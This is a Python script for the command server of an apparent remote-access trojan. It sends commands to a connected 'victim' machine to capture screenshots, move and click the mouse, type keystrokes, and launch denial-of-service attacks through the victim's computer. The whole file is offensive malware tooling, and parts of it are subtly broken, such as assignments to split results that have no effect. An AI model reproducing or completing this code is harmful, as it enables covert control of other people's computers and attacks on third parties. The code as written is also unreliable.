import socket
from socket import socket,AF_INET,SOCK_STREAM

while True:

    #binding on port 1295 and listenning :
    s=socket(AF_INET,SOCK_STREAM)
    s.bind(("127.0.0.1",1295))
    s.listen(2)

    #accepting the incoming connection requests :
    conn,addr = s.accept()

    #sending commands :

    #getting commands :
    inp=input("command : ")

    #getting screenshot :
    if inp == "send screenshot" :
        conn.send(inp.encode())
        r=conn.recv(1000000)
        if r:
            o=open("screenshot.png","wb")
            o.write(r)
            o.close()
    
    #moving the mouse :
    elif inp == "mouse moving":
        x=input("x : ")
        y=input("y : ")
        mouse = "mouse "+str(x)+" "+str(y)
        conn.send(mouse.encode())
        r=conn.recv(1000000)
        print(r.decode())

    #mouse clicking :
    elif inp == "lc":
        conn.send(b"lc")
    elif inp == "rc":
        conn.send(b"rc")
    
    #keyboard:
    elif inp == "type":
        st=str(input("string : "))
        conn.send(b"keyboard type")
        r=conn.recv(1000000)
        if r:
            conn.send(st.encode())
    
    #dos attack using victim's computer:
    elif inp.split(" ")[0] == "dos":
        try :
            inp.split(" ")[2] = int(inp.split(" ")[2])
            inp.split(" ")[3] = int(inp.split(" ")[3])
            inp.split(" ")[4] = int(inp.split(" ")[4])
            conn.send(str("dos "+str(inp.split(" ")[1])+" "+str(inp.split(" ")[2])+" "+str(inp.split(" ")[3])+" "+str(inp.split(" ")[4])).encode())
            #1 : ip 2 : port 3 : threads 4 : time
            r=conn.recv(1000000)
            if r:
                if r == "error":
                    print("you did face to an error")
                else:
                    print("success")
        except Exception as e:
            print("some parameters are wrong {}".format(e))

    #closing the connections :
    conn.close()
    s.close()
